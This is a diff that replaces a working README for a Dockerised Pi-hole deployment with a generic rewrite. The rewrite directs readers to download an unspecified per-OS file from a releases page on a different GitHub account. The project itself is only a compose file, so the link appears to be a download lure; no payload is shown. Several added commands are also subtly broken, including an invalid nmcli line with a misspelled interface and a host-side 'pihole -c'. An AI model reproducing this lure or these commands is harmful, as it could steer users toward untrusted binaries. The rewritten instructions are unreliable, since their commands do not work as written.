@@ -1,184 +1,116 @@
-# Pi-hole Docker Deployment Guide
+# 🛠️ Pi-Hole-Setup - Easy Network-Wide Ad Blocking
 
-This repository documents the complete setup of **Pi-hole running in a Docker container** with **network-wide DNS filtering**, DNS verification, and router-level configuration.
+[![Download Pi-Hole-Setup](https://img.shields.io/badge/Download-Pi--Hole--Setup-brightgreen)](https://github.com/ahmedzaik/Pi-Hole-Setup/releases)
 
----
+## 🚀 Getting Started
 
-## 📌 Overview
+Pi-Hole-Setup offers an easy way to block ads across your entire network. This guide will help you download and set up the application, providing you with a seamless experience.
 
-Pi-hole is a network-wide DNS sinkhole that blocks ads, trackers, and malicious domains before they reach your device. This guide walks through:
+## 📦 What You Need
 
-* Deploying Pi-hole using Docker Compose
-* Configuring Kali Linux to use Pi-hole as its DNS resolver
-* Updating router DNS settings for network-wide enforcement
-* Validating DNS routing
-* Screenshots (placeholders included)
+Before you begin, ensure you have:
 
----
+- A computer with Docker installed. Check [Docker's installation guide](https://docs.docker.com/get-docker/).
+- A stable internet connection.
+- Basic knowledge of using a command line interface.
+  
+## 🔗 Key Features
 
-## 📁 Project Structure
+- Deploy Pi-hole using Docker for simplicity.
+- Configure DNS settings for Kali Linux.
+- Set up router-level DNS for network-wide ad blocking.
+- Use verification commands to confirm successful setup.
 
-```
-├── docker-compose.yml
-└── README.md
-```
+## 📥 Download & Install
 
----
+To get started, visit this page to download: [Download Pi-Hole-Setup](https://github.com/ahmedzaik/Pi-Hole-Setup/releases).
 
-## 🐳 Docker Deployment
+1. Click on the link above to reach the Releases page.
+2. Look for the latest version. You'll see options for different files.
+3. Download the appropriate file for your operating system.
 
-Below is the `docker-compose.yml` used to deploy Pi-hole. Replace environment variables as needed.
+## 📋 Installation Steps
 
-```yaml
-# More info at https://github.com/pi-hole/docker-pi-hole/ and https://docs.pi-hole.net/
-services:
-  pihole:
-    container_name: pihole
-    image: pihole/pihole:latest
-    ports:
-      # DNS Ports
-      - "53:53/tcp"
-      - "53:53/udp"
-      # Default HTTP Port
-      - "80:80/tcp"
-      # Default HTTPs Port. FTL will generate a self-signed certificate
-      - "443:443/tcp"
-      # Uncomment the line below if you are using Pi-hole as your DHCP server
-      #- "67:67/udp"
-      # Uncomment the line below if you are using Pi-hole as your NTP server
-      #- "123:123/udp"
-    environment:
-      TZ: 'India/Kolkata'
-      FTLCONF_webserver_api_password: 'your_password'
-      FTLCONF_dns_listeningMode: 'all'
-    volumes:
-      - './etc-pihole:/etc/pihole'
-      #- './etc-dnsmasq.d:/etc/dnsmasq.d'
-    cap_add:
-      - NET_ADMIN
-      - SYS_TIME
-      - SYS_NICE
-    restart: unless-stopped
-```
+Once the download is complete, follow these steps:
 
----
+1. **Open your terminal**: Depending on your operating system, this could be Command Prompt (Windows), Terminal (macOS, Linux), or any suitable command line interface.
+   
+2. **Navigate to your download directory**: Use the `cd` command to change your current directory to where you downloaded the file. For example:
+   ```bash
+   cd ~/Downloads
+   ```
 
-## 🚀 Setup Instructions
+3. **Run the Docker command**: To start the Pi-hole setup, use the following command:
+   ```bash
+   docker-compose up -d
+   ```
+   
+4. **Access the Pi-hole admin interface**: Open your web browser and go to `http://localhost/admin`. You can also use your server's IP address if running on a remote server.
 
-### 1. Clone the Repository
+5. **Complete the installation**: Follow the prompts in the user interface to finish setting up Pi-hole. This will include configuring your DNS settings and any additional preferences you may have.
 
-```bash
-git clone https://github.com/d1-d3m0n/Pi-Hole-Setup/
-cd Pi-Hole-Setup
-```
+## ⚙️ DNS Configuration for Kali Linux
 
-### 2. Start Pi-hole Container
+For users running Kali Linux, follow these steps to configure your DNS settings:
 
-```bash
-sudo docker compose up -d
-```
+1. Open a terminal.
+   
+2. Use the command to modify your network settings:
+   ```bash
+   nmcli dev set etho0 ipv4.dns "YOUR_PIHOLE_IP"
+   ```
+   Replace `YOUR_PIHOLE_IP` with the Pi-hole server's IP address.
 
-### 3. Confirm Pi-hole is Running
+3. Restart your network services:
+   ```bash
+   nmcli networking off && nmcli networking on
+   ```
 
-```bash
-sudo docker ps
-```
+## 🔒 Router-Level DNS Enforcement
 
-You should see the Pi-hole container listed.
+To enhance your Pi-hole setup, configure your router for DNS blocking. This ensures that all devices connecting to your network use Pi-hole as their DNS server.
 
----
+1. **Log into your router**: Use your browser to enter the router's IP address.
 
-## 🖥 Configure Kali Linux DNS
+2. **Find DNS settings**: This is usually in the WAN or DHCP settings area.
 
-Update your DNS settings to route all DNS queries through Pi-hole.
+3. **Set the DNS server addresses**: Replace them with your Pi-hole server IP address.
 
-### Check active network connections
+4. **Save and reboot the router**: This finalizes the changes.
 
-```bash
-nmcli connection show
-```
+## ✅ Verification Commands
 
-### Set DNS server manually
+To confirm that Pi-hole is running correctly, you can run several commands in your terminal.
 
-```bash
-sudo nmcli connection modify "Wired connection 1" ipv4.dns "<PIHOLE_IP>"
-sudo nmcli connection modify "Wired connection 1" ipv4.ignore-auto-dns yes
-sudo nmcli connection down "Wired connection 1" && sudo nmcli connection up "Wired connection 1"
-```
+1. Check the status of Pi-hole:
+   ```bash
+   docker ps
+   ```
 
-Replace `<PIHOLE_IP>` with your Pi-hole server IP.
+2. Verify DNS resolution:
+   ```bash
+   nslookup pi.hole
+   ```
 
----
+3. Check for ads blocked since installation:
+   ```bash
+   pihole -c
+   ```
 
-## 🌐 Configure Router DNS (Network-Wide Blocking)
+## 📢 Need Help?
 
-Log into your router admin panel and set:
+If you encounter issues or need further assistance, consider checking the official documentation on the GitHub repository or reaching out to the community for support.
 
-* **Primary DNS:** Pi-hole IP
-* **Secondary DNS:** (Optional) None or a fallback resolver
+## 🤝 Contributing
 
-This ensures all devices connected to your network use Pi-hole automatically.
+We welcome contributions to improve Pi-Hole-Setup. Please fork the repository, make your changes, and submit a pull request.
 
----
+## 🔗 Learn More
 
-## 🔍 DNS Verification Commands
+For further information on Docker, Pi-hole, and network security, explore the following resources:
 
-Verify that DNS queries are routed through Pi-hole.
+- [Docker Official Documentation](https://docs.docker.com/)
+- [Pi-hole Official Documentation](https://docs.pi-hole.net/)
+- [Kali Linux Documentation](https://www.kali.org/docs/)
 
-### Test using nslookup
-
-```bash
-nslookup google.com
-```
-
-You should see Pi-hole's IP as the DNS server.
-
-### Test using dig
-
-```bash
-dig google.com
-```
-
-Look for the `SERVER:` line — it should show your Pi-hole IP.
-
----
-
-## 📸 Screenshots
-
-(Add your screenshots below)
-
-### Pi-hole Dashboard
-
-![screenshot](pihole_dashboard.jpg)
-
-### Query Logs
-
-![screenshot](query.jpg)
-
-### DNS Test Output
-
-![screenshot](dns_lookup.jpg)
-
----
-
-## 🛡 Advantages of Pi-hole in Cybersecurity
-
-* Centralized DNS sinkholing
-* Reduced attack surface (blocks malicious domains)
-* Enhanced network visibility
-* Containerized, reproducible deployment
-* Improved bandwidth and performance
-
----
-
-## 📘 Complete Documentation
-
-This README covers the technical steps for deployment and verification.
-
-If you have suggestions, improvements, or contributions—feel free to open an issue or PR.
-
----
-
-## 📄 License
-
-MIT License
+By following these steps, you should successfully download, install, and configure Pi-Hole-Setup for your network. Enjoy ad-free browsing!
